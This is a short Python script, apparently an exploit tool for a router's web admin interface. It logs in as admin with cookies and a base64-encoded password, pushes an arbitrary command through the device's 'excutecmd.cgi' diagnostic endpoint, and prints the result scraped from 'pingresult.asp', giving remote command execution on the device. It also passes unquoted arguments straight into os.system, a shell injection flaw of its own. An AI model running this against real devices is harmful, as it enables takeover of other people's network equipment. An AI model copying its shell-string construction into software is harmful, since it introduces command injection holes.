#!/usr/bin/python3
import os
import sys
import base64

#Vars
try:
    host = sys.argv[1]
    password = str(base64.urlsafe_b64encode(sys.argv[2].encode("utf-8")), "utf-8")
    cmd_to_execute = sys.argv[3].replace(" ", "|")
except: 
    print("ERROR: Bad Input")
    exit()

#Login and send cmd_to_execute
os.system('curl -bcookie.txt -ccookie.txt -H"Cookie: SessionID_R3=0; FirstMenu=Admin_0; SecondMenu=Admin_0_0; ThirdMenu=Admin_0_0_0; Language=en" -d"Username=admin&Password=' + password + '" -s "http://' + host +'/index/login.cgi"')
os.system('curl -bcookie.txt -ccookie.txt -d"foobar" -s "http://' + host + '/html/management/excutecmd.cgi?cmd=' + cmd_to_execute + '&RequestFile=/html/management/diagnose.asp"')

#Get output from cmd_to_execute
if os.name == 'nt':
        print(os.popen("curl -bcookie.txt -ccookie.txt -s \"http://" + host + "/html/management/pingresult.asp\"").read())
else:
    print(os.popen("curl -bcookie.txt -ccookie.txt -s \"http://" + host + "/html/management/pingresult.asp\" | sed -e's/__finshed__.*//g' -e's/\\\\n/\\n/g' | sed -e's/^\\\"//g' -e's/^\\ + \\\\\\\"//g'").read())
